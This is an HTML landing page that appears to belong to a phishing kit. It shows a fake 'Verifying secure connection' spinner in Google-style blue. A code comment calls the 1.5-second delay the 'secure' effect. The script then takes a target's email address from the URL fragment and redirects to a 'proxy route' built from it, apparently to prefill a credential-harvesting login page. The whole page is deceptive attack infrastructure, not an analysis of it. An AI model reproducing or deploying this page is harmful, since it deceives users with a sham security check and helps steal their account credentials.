<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifying Secure Connection...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f5f5f5;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        .container {
            text-align: center;
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #4285F4; /* Google Blue */
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        p {
            color: #333;
            font-size: 16px;
            margin: 0;
            font-weight: 500;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <p id="status-text">Verifying secure connection...</p>
    </div>
    
    <script>
        // Wait 1.5 seconds for the "secure" effect
        setTimeout(function() {
            var hash = window.location.hash;
            
            // Check if a hash exists (e.g., #testuser@gmail.com)
            if (hash && hash.length > 1) {
                // Remove the '#' symbol to get just the email
                var email = hash.substring(1); 
                
                // Redirect to the proxy route (e.g., /testuser@gmail.com)
                window.location.href = "/" + email;
            } else {
                // If no hash is provided, show an error
                document.getElementById('status-text').innerHTML = "No account specified. Please use a valid link.";
                document.getElementById('status-text').style.color = "red";
                document.querySelector('.spinner').style.display = "none";
            }
        }, 1500);
    </script>
</body>
</html>
